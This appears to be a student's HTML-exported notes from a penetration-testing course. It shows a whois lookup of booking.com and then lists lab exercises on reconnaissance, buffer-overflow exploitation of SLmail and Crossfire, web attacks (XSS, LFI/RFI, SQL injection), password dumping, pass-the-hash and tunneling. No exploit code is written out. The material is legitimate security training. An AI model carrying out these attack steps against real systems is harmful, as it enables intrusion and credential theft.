rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 11pt;">root@kali:~# whois <a href="http://booking.com/">booking.com</a></font></div><div><font style="font-size: 11pt;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Domain Name: <a href="http://booking.com/">BOOKING.COM</a></font></div><div><font style="font-size: 11pt;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Registry Domain ID: 4913307_DOMAIN_COM-VRSN</font></div><div><font style="font-size: 11pt;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Registrar WHOIS Server: <a href="http://whois.markmonitor.com/">whois.markmonitor.com</a></font></div><div><font style="font-size: 11pt;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Registrar URL: <a href="http://www.markmonitor.com/">http://www.markmonitor.com</a></font></div><div><font style="font-size: 11pt;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Updated Date: 2014-05-28T15:42:13Z</font></div><div><font style="font-size: 11pt;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Creation Date: 1998-04-17T04:00:00Z</font></div><div><font style="font-size: 11pt;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Registry Expiry Date: 2020-04-16T04:00:00Z</font></div><div><font style="font-size: 11pt;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Registrar: MarkMonitor Inc.</font></div><div><font style="font-size: 11pt;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Registrar IANA ID: 292</font></div><div><font style="font-size: 11pt;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Registrar Abuse Contact Email: <a href="mailto:abusecomplaints@markmonitor.com">abusecomplaints@markmonitor.com</a></font></div><div><font style="font-size: 11pt;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Registrar Abuse Contact Phone: +1.2083895740</font></div><div><font style="font-size: 11pt;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Domain Status: clientDeleteProhibited <a href="https://icann.org/epp#clientDeleteProhibited">https://icann.org/epp#clientDeleteProhibited</a></font></div><div><font style="font-size: 11pt;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Domain Status: clientTransferProhibited <a href="https://icann.org/epp#clientTransferProhibited">https://icann.org/epp#clientTransferProhibited</a></font></div><div><font style="font-size: 11pt;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Domain Status: clientUpdateProhibited <a href="https://icann.org/epp#clientUpdateProhibited">https://icann.org/epp#clientUpdateProhibited</a></font></div><div><font style="font-size: 11pt;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Domain Status: serverDeleteProhibited <a href="https://icann.org/epp#serverDeleteProhibited">https://icann.org/epp#serverDeleteProhibited</a></font></div><div><font style="font-size: 11pt;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Domain Status: serverTransferProhibited <a href="https://icann.org/epp#serverTransferProhibited">https://icann.org/epp#serverTransferProhibited</a></font></div><div><font style="font-size: 11pt;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Domain Status: serverUpdateProhibited <a href="https://icann.org/epp#serverUpdateProhibited">https://icann.org/epp#serverUpdateProhibited</a></font></div><div><font style="font-size: 11pt;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Name Server: <a href="http://ns0.bkngs.com/">NS0.BKNGS.COM</a></font></div><div><font style="font-size: 11pt;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Name Server: <a href="http://ns1.bkngs.com/">NS1.BKNGS.COM</a></font></div><div><font style="font-size: 11pt;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Name Server: <a href="http://ns2.bkngs.com/">NS2.BKNGS.COM</a></font></div><div><font style="font-size: 11pt;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Name Server: <a href="http://ns3.bkngs.com/">NS3.BKNGS.COM</a></font></div><div><font style="font-size: 11pt;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DNSSEC: unsigned</font></div><div><font style="font-size: 11pt;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;URL of the ICANN Whois Inaccuracy Complaint Form: <a href="https://www.icann.org/wicf/">https://www.icann.org/wicf/</a></font></div><div><br/></div><div><br/></div><div><font style="font-size: 11pt;">The Registry database contains ONLY .COM, .NET, .EDU domains and</font></div><div><font style="font-size: 11pt;">Registrars.</font></div><div><font style="font-size: 11pt;">Domain Name: <a href="http://booking.com/">booking.com</a></font></div><div><font style="font-size: 11pt;">Registry Domain ID: 4913307_DOMAIN_COM-VRSN</font></div><div><font style="font-size: 11pt;">Registrar WHOIS Server: <a href="http://whois.markmonitor.com/">whois.markmonitor.com</a></font></div><div><font style="font-size: 11pt;">Registrar URL: <a href="http://www.markmonitor.com/">http://www.markmonitor.com</a></font></div><div><font style="font-size: 11pt;">Updated Date: 2017-01-25T12:34:54-0800</font></div><div><font style="font-size: 11pt;">Creation Date: 1998-04-16T21:00:00-0700</font></div><div><font style="font-size: 11pt;">Registrar Registration Expiration Date: 2020-04-15T21:00:00-0700</font></div><div><font style="font-size: 11pt;">Registrar: MarkMonitor, Inc.</font></div><div><font style="font-size: 11pt;">Registrar IANA ID: 292</font></div><div><font style="font-size: 11pt;">Registrar Abuse Contact Email: <a href="mailto:abusecomplaints@markmonitor.com">abusecomplaints@markmonitor.com</a></font></div><div><font style="font-size: 11pt;">Registrar Abuse Contact Phone: +1.2083895740</font></div><div><font style="font-size: 11pt;">Domain Status: clientUpdateProhibited (<a href="https://www.icann.org/epp#clientUpdateProhibited">https://www.icann.org/epp#clientUpdateProhibited</a>)</font></div><div><font style="font-size: 11pt;">Domain Status: clientTransferProhibited (<a href="https://www.icann.org/epp#clientTransferProhibited">https://www.icann.org/epp#clientTransferProhibited</a>)</font></div><div><font style="font-size: 11pt;">Domain Status: clientDeleteProhibited (<a href="https://www.icann.org/epp#clientDeleteProhibited">https://www.icann.org/epp#clientDeleteProhibited</a>)</font></div><div><font style="font-size: 11pt;">Domain Status: serverUpdateProhibited (<a href="https://www.icann.org/epp#serverUpdateProhibited">https://www.icann.org/epp#serverUpdateProhibited</a>)</font></div><div><font style="font-size: 11pt;">Domain Status: serverTransferProhibited (<a href="https://www.icann.org/epp#serverTransferProhibited">https://www.icann.org/epp#serverTransferProhibited</a>)</font></div><div><font style="font-size: 11pt;">Domain Status: serverDeleteProhibited (<a href="https://www.icann.org/epp#serverDeleteProhibited">https://www.icann.org/epp#serverDeleteProhibited</a>)</font></div><div><font style="font-size: 11pt;">Registry Registrant ID:</font></div><div><font style="font-size: 11pt;">Registrant Name: Domain Administrators</font></div><div><font style="font-size: 11pt;">Registrant Organization: <a href="http://booking.com/">Booking.com</a> B.V.</font></div><div><font style="font-size: 11pt;">Registrant Street: Herengracht 597,</font></div><div><font style="font-size: 11pt;">Registrant City: Amsterdam</font></div><div><font style="font-size: 11pt;">Registrant State/Province:</font></div><div><font style="font-size: 11pt;">Registrant Postal Code: 1017 CE</font></div><div><font style="font-size: 11pt;">Registrant Country: NL</font></div><div><font style="font-size: 11pt;">Registrant Phone: +31.207125600</font></div><div><font style="font-size: 11pt;">Registrant Phone Ext:</font></div><div><font style="font-size: 11pt;">Registrant Fax: +31.207125609</font></div><div><font style="font-size: 11pt;">Registrant Fax Ext:</font></div><div><font style="font-size: 11pt;">Registrant Email: <a href="mailto:domain@booking.com">domain@booking.com</a></font></div><div><font style="font-size: 11pt;">Registry Admin ID:</font></div><div><font style="font-size: 11pt;">Admin Name: Domain Administrators</font></div><div><font style="font-size: 11pt;">Admin Organization: <a href="http://booking.com/">Booking.com</a> B.V.</font></div><div><font style="font-size: 11pt;">Admin Street: Herengracht 597,</font></div><div><font style="font-size: 11pt;">Admin City: Amsterdam</font></div><div><font style="font-size: 11pt;">Admin State/Province:</font></div><div><font style="font-size: 11pt;">Admin Postal Code: 1017 CE</font></div><div><font style="font-size: 11pt;">Admin Country: NL</font></div><div><font style="font-size: 11pt;">Admin Phone: +31.207125600</font></div><div><font style="font-size: 11pt;">Admin Phone Ext:</font></div><div><font style="font-size: 11pt;">Admin Fax: +31.207125609</font></div><div><font style="font-size: 11pt;">Admin Fax Ext:</font></div><div><font style="font-size: 11pt;">Admin Email: <a href="mailto:domain@booking.com">domain@booking.com</a></font></div><div><font style="font-size: 11pt;">Registry Tech ID:</font></div><div><font style="font-size: 11pt;">Tech Name: Domain Administrators</font></div><div><font style="font-size: 11pt;">Tech Organization: <a href="http://booking.com/">Booking.com</a> B.V.</font></div><div><font style="font-size: 11pt;">Tech Street: Herengracht 597,</font></div><div><font style="font-size: 11pt;">Tech City: Amsterdam</font></div><div><font style="font-size: 11pt;">Tech State/Province:</font></div><div><font style="font-size: 11pt;">Tech Postal Code: 1017 CE</font></div><div><font style="font-size: 11pt;">Tech Country: NL</font></div><div><font style="font-size: 11pt;">Tech Phone: +31.207125600</font></div><div><font style="font-size: 11pt;">Tech Phone Ext:</font></div><div><font style="font-size: 11pt;">Tech Fax: +31.207125609</font></div><div><font style="font-size: 11pt;">Tech Fax Ext:</font></div><div><font style="font-size: 11pt;">Tech Email: <a href="mailto:domain@booking.com">domain@booking.com</a></font></div><div><font style="font-size: 11pt;">Name Server: <a href="http://ns3.bkngs.com/">ns3.bkngs.com</a></font></div><div><font style="font-size: 11pt;">Name Server: <a href="http://ns0.bkngs.com/">ns0.bkngs.com</a></font></div><div><font style="font-size: 11pt;">Name Server: <a href="http://ns1.bkngs.com/">ns1.bkngs.com</a></font></div><div><font style="font-size: 11pt;">Name Server: <a href="http://ns2.bkngs.com/">ns2.bkngs.com</a></font></div><div><font style="font-size: 11pt;">DNSSEC: unsigned</font></div></div><div><hr/><div><span style="font-size: 11pt; color: rgb(255, 0, 0); font-weight: bold; text-decoration: underline;">TODO:</span></div></div><div><span style="font-size: 11pt;">4.1.7 Exercises</span></div><div><span style="font-size: 11pt;">1. Find the DNS servers for the</span> <a href="http://megacorpone.com!domain/" style="font-size: 11pt;">megacorpone.com domain</a></div><div><span style="font-size: 11pt;">2. Write a small Bash script to attempt a zone transfer from</span> <a href="http://megacorpone.com/" style="font-size: 11pt;">megacorpone.com</a></div><div><span style="font-size: 11pt;">3. Use</span> <span style="font-size: 11pt; color: rgb(0, 0, 0);">dnsrecon</span> <span style="font-size: 11pt;">to attempt a zone transfer from</span> <a href="http://megacorpone.com/" style="font-size: 11pt;">megacorpone.com</a></div><div><hr/></div><div><span style="font-size: 11pt; color: rgb(255, 0, 0); font-weight: bold; text-decoration: underline;">TODO:</span></div><div><span style="font-size: 11pt;">4.2.8 Exercises</span></div><div><span style="font-size: 11pt;">1. Use</span> <span style="font-size: 11pt; color: rgb(0, 0, 0);">nmap</span> <span style="font-size: 11pt;">to conduct a ping sweep of your target IP range and save the output to a file, so that you can grep for hosts that are online.</span></div><div><span style="font-size: 11pt;">2. Scan the IPs you found in exercise 1 for open webserver ports. Use</span> <span style="font-size: 11pt; color: rgb(0, 0, 0);">nmap</span> <span style="font-size: 11pt;">to find the web server and operating system versions.</span></div><div><span style="font-size: 11pt;">3. Use the NSE scripts to scan the servers in the labs which are running the SMB service.</span></div><div><span style="font-size: 11pt;">4. Explore the various command line options that nmap offers while scanning an online host you discovered within your target IP range. Monitor the bandwidth usage changes for the different options. Weigh the use of collecting as much information as possible against the resources it takes to gather it.</span></div></div><div><hr/><div><font style="font-size: 11pt;"><span style="font-size: 11pt; color: rgb(255, 0, 0); font-weight: bold; text-decoration: underline;">TODO:</span></font></div></div><div><span style="font-size: 11pt;">4.3.4 Exercises</span></div><div><span style="font-size: 11pt;">1. Use Nmap to make a list of which SMB servers in the lab are running Windows.</span></div><div><span style="font-size: 11pt;">2. Use NSE scripts to scan these systems for SMB vulnerabilities.</span></div><div><span style="font-size: 11pt;">3. Use</span> <span style="font-size: 11pt; color: rgb(0, 0, 0);">nbtscan</span> <span style="font-size: 11pt;">and</span> <span style="font-size: 11pt; color: rgb(0, 0, 0);">enum4linux</span> <span style="font-size: 11pt;">against these systems and identify the kinds of data you can obtain from different versions of Windows.</span></div><div><hr/></div><div><span style="font-size: 11pt; color: rgb(255, 0, 0); font-weight: bold; text-decoration: underline;">TODO:</span></div><div><span style="font-size: 11pt;">4.4.1 Exercise</span></div><div><span style="font-size: 11pt;">1. Search your target network range, and see if you can identify any systems that respond to the SMTP VRFY command.</span></div><div><hr/><div><span style="font-size: 11pt; color: rgb(255, 0, 0); font-weight: bold; text-decoration: underline;">TODO:</span></div></div><div><span style="font-size: 11pt;">4.5.4 Exercises</span></div><div><span style="font-size: 11pt;">1. Scan your target network with&nbsp;&nbsp;</span><span style="font-size: 11pt; color: rgb(0, 0, 0);">onesixtyone</span><span style="font-size: 11pt;">. Identify any SNMP servers.</span></div><div><span style="font-size: 11pt;">2. Use</span> <span style="font-size: 11pt; color: rgb(0, 0, 0);">snmpwalk</span> <span style="font-size: 11pt;">and</span> <span style="font-size: 11pt; color: rgb(0, 0, 0);">snmpcheck</span> <span style="font-size: 11pt;">to gather information about the discovered targets.</span></div><div><hr/><hr/></div><div><span style="font-size: 11pt; color: rgb(255, 0, 0); font-weight: bold; text-decoration: underline;">TODO:</span></div><div><span style="font-size: 11pt;">5.2.2 Exercises</span></div><div><span style="font-size: 11pt;">1. Use</span> <span style="font-size: 11pt; color: rgb(0, 0, 0);">nmap</span> <span style="font-size: 11pt;">scripts and OpenVAS to conduct targeted scans (against single hosts) against systems in your target network.</span></div><div><span style="font-size: 11pt;">2. Account for the traffic using iptables. How many resources does scanning a single host require, in terms of network bandwidth, and time?</span></div><div><span style="font-size: 11pt;">3. Consider the sort of vulnerabilities a scanner will identify. What are the limitations of the tool? Why?</span></div><div><hr/><hr/></div><div><span style="font-size: 11pt;">6.1.4 Exercises</span></div><div><span style="font-size: 11pt;">1. Fuzz SLmail and replicate the crash.</span></div><div><span style="font-size: 11pt;">2. Examine the memory in the stack, when SLmail crashes. What does it look like? Consider how this might be useful.</span></div><div><hr/></div><div><hr/></div><div><span style="font-size: 11pt;">7.2.3 Exercises</span></div><div><span style="font-size: 11pt;">1. Write a standalone script to replicate the crash.</span></div><div><span style="font-size: 11pt;">2. Determine the offset of EIP for the data that is being sent.</span></div><div><span style="font-size: 11pt;">3. Update your standalone script to place a unique value into EIP, to ensure your offsets are correct.</span></div><div><hr/></div><div><span style="font-size: 11pt;">7.4.1 Exercises</span></div><div><span style="font-size: 11pt;">1. Identify the bad characters that cannot be included in the payload.</span></div><div><span style="font-size: 11pt;">2. Understand why these characters are not allowed. What does the hex translate to in ASCII?</span></div><div><hr/></div><div><span style="font-size: 11pt;">7.5.2 Exercises</span></div><div><span style="font-size: 11pt;">1. Identify a JMP ESP that is usable in the exploit.</span></div><div><span style="font-size: 11pt;">2. Update your PoC to include the discovered JMP ESP, set a break point on it, and follow the execution.</span></div><div><hr/></div><div><span style="font-size: 11pt;">7.7.1 Exercises</span></div><div><span style="font-size: 11pt;">1. Update your PoC to include a working payload.</span></div><div><span style="font-size: 11pt;">2. Obtain a shell from SLmail.</span></div><div><hr/></div><div><span style="font-size: 11pt;">7.8.1 Exercises</span></div><div><span style="font-size: 11pt;">1. Update the exploit so that SLmail still runs after exploitation.</span></div><div><span style="font-size: 11pt;">2.In the Tools folder on the Desktop of your Windows VM, there is a VulnServer.exe application. Using the proof of concept from the following forum post, develop a working exploit:</span> <a href="https://forums.offensivelsecurity.com/showthread.php?t=2231" style="font-size: 11pt;">https://forums.offensiveLsecurity.com/showthread.php?t=2231</a></div><div><hr/><hr/></div><div><span style="font-size: 11pt;">8.2.1 Exercise</span></div><div><span style="font-size: 11pt;">1. Create a PoC that crashes the Crossfire server.</span></div><div><hr/></div><div><span style="font-size: 11pt;">8.6.1 Exercises</span></div><div><span style="font-size: 11pt;">1. Update your POC so you have control of the EIP register.</span></div><div><span style="font-size: 11pt;">2. Identify what characters you cannot use as part of your payload.</span></div><div><hr/></div><div><span style="font-size: 11pt;">8.8.1 Exercise</span></div><div><span style="font-size: 11pt;">1. Update your proof of concept and obtain a shell from Crossfire.</span></div><div><hr/></div><div><hr/></div><div><span style="font-size: 11pt;">9.2.3 Exercises</span></div><div><span style="font-size: 11pt;">1. Fix and compile 643.c to exploit your SLMail installation</span></div><div><span style="font-size: 11pt;">2. Fix and compile 646.c under Linux using mingw</span></div><div><hr/><hr/></div><div><span style="font-size: 11pt;">11.2.3 Exercises</span></div><div><span style="font-size: 11pt;">1. Use pyinstaller to compile a Python exploit into a standalone .exe.</span></div><div><span style="font-size: 11pt;">2. Install Photodex ProShow Producer on your Windows host. Escalate privileges&nbsp;&nbsp;from a standard user account.</span></div><div><span style="font-size: 11pt;">3. Can you find additional ways of escalating permissions, outside of what is&nbsp;&nbsp;described in the course?</span></div><div><hr/><hr/></div><div><span style="font-size: 11pt;">12.2.3 Exercises</span></div><div><span style="font-size: 11pt;">1. Use MS12-037 to exploit your Windows host from your Kali system, using the&nbsp;&nbsp;default exploit.</span></div><div><span style="font-size: 11pt;">2. Enable the Windows firewall and exploit it again. Identify why the attack no&nbsp;&nbsp;longer works and correct it so you can get a shell.</span></div><div><hr/></div><div><span style="font-size: 11pt;">12.3.1 Exercises</span></div><div><span style="font-size: 11pt;">1. Exploit your Windows host with a Java payload attack.</span></div><div><span style="font-size: 11pt;">2. Play with the settings you used when generating the payload. What makes the attack look more believable? What makes it look less believable?</span></div><div><hr/><hr/></div><div><span style="font-size: 11pt;">13.2.3 Exercises</span></div><div><span style="font-size: 11pt;">1. Exploit the XSS vulnerability in the guestbook application to get the admin cookie and hijack the session.</span></div><div><span style="font-size: 11pt;">2. Consider what other ways an XSS here might be able to be used for attacks.</span></div><div><span style="font-size: 11pt;">3. Does this exploit attack the server or clients of the site?</span></div><div><hr/><div><span style="font-size: 11pt;">13.3.1.3 Exercises</span></div></div><div><span style="font-size: 11pt;">1. Obtain code execution through the use of the LFI attack.</span></div><div><span style="font-size: 11pt;">2. Using what you learned on file transfers, use the code execution to obtain a full&nbsp;&nbsp;shell.</span></div><div><hr/><div><span style="font-size: 11pt;">13.3.2.1 Exercise</span></div></div><div><span style="font-size: 11pt;">1. Exploit the RFI vulnerability in the web application and get your shell.</span></div><div><hr/></div><div><span style="font-size: 11pt;">13.4.1.1 Exercises</span></div><div><span style="font-size: 11pt;">1. Interact with the MySQL database and manually execute the commands as the web server does as part of the authentication process. Understand the vulnerability.</span></div><div><span style="font-size: 11pt;">2. Utilize SQL injection to bypass the login process.</span></div><div><span style="font-size: 11pt;">3. Understand why the username is reported like it is once the authentication process is bypassed.</span></div><div><hr/></div><div><span style="font-size: 11pt;">13.4.5.1 Exercises</span></div><div><span style="font-size: 11pt;">1. Enumerate the structure of the database using SQL injection.</span></div><div><span style="font-size: 11pt;">2. Understand how and why you can pull data from your injected commands and have it displayed on the screen.</span></div><div><span style="font-size: 11pt;">3. Extract all users and associated passwords from the database.</span></div><div><hr/></div><div>13.4.6.1 Exercises</div><div>1. Exploit the SQL injection along with the MySQL <span style="color: rgb(0, 0, 0);">INTO&amp; OUTFILE</span> function to obtain code execution.</div><div>2. Turn the simple code execution into a full shell.</div><div><hr/></div><div>13.5.1 Exercises</div><div>1. Use Tamper Data to cause SQL injection on the lang parameter.</div><div><div>2. Identify how far you can push this vulnerability. Can you obtain a full shell?</div><hr/></div><div>13.6.1 Exercises</div><div>1. Exploit the SQL injection vulnerability in the guestbook application to log in as the admin user.</div><div>2. Manually use SQL injection to enumerate the information in the guestbook database.</div><div>3. Use <span style="color: rgb(0, 0, 0);">sqlmap</span> to obtain a full dump of the database.</div><div>4. Use <span style="color: rgb(0, 0, 0);">sqlmap</span> to obtain an interactive shell.</div><div><hr/></div><div>14.1.5 Exercises</div><div>1. Use pwdump on your Windows system.</div><div>2. Use WCE on your Windows system.</div><div><hr/></div><div>14.2.3 Exercises</div><div>1. Conduct targeted password attacks on systems within your target network range.</div><div>2. Identify the protocols that run well. Which do not?</div><div>3. Ensure that you don't lock out any accounts.</div><div><hr/></div><div>14.3.6 Exercises</div><div>1. Use the different tools covered in this module to conduct password attacks against various services in the lab.</div><div>2. Use Metasploit to exploit one of the SMB servers in the labs. Dump the password hashes and attempt a pass-the-hash attack against another system</div><div><hr/><hr/></div><div>15.5.1 Exercises</div><div>1. Experiment with the various tunneling options presented.</div><div>2. Use SSH to proxy out your web surfing through your Kali host.</div><div><hr/><hr/></div><div><br/></div></body></html>